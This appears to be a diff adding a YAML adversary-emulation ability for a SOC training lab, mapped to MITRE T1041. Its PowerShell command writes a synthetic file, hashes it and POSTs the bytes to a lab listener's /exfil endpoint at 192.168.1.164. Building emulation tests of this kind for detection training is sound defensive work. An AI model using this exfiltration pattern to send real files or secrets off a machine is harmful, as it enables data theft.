@@ -1,0 +1,25 @@
+- id: file-transfer-000000000002
+  name: File Transfer to Internal Listener with SHA256 Receipt
+  description: >-
+    Writes a small synthetic text file under the lab directory, computes its SHA256 and POSTs the file bytes to the approved internal listener with hash headers so both sides can compare receipts.
+  technique_id: T1041
+  technique_name: Exfiltration Over C2 Channel
+  repeatable: false
+  executors:
+    - name: psh
+      platform: windows
+      command: |
+        $ErrorActionPreference = 'Stop'
+        $dir = 'C:\SOC-Lab\EP03\demo'
+        New-Item -ItemType Directory -Force -Path $dir | Out-Null
+        $payload = (1..32 | ForEach-Object { 'DEMO-EXFIL-PAYLOAD line ' + $_.ToString('00') + ' - synthetic training data, no personal data' }) -join "`r`n"
+        Set-Content -LiteralPath "$dir\payload_demo.txt" -Value $payload -Encoding ASCII
+        $bytes = [System.IO.File]::ReadAllBytes("$dir\payload_demo.txt")
+        if ($bytes.Length -gt 64KB) { Write-Output 'EP03_EXFIL_ERROR over_size_bound'; exit 1 }
+        $sha = (Get-FileHash -Algorithm SHA256 "$dir\payload_demo.txt").Hash
+        $resp = Invoke-WebRequest -UseBasicParsing -Method Post -Uri 'http://192.168.1.164:18765/exfil' -Body $bytes -ContentType 'text/plain' -Headers @{ 'X-Demo-Name' = 'payload_demo.txt'; 'X-Demo-SHA256' = $sha } -TimeoutSec 10
+        Write-Output ("EP03_EXFIL_SENT sha=" + $sha + " bytes=" + $bytes.Length + " status=" + $resp.StatusCode)
+        Write-Output $resp.Content
+        if ($resp.StatusCode -ne 200) { exit 1 }
+        exit 0
+      timeout: 60
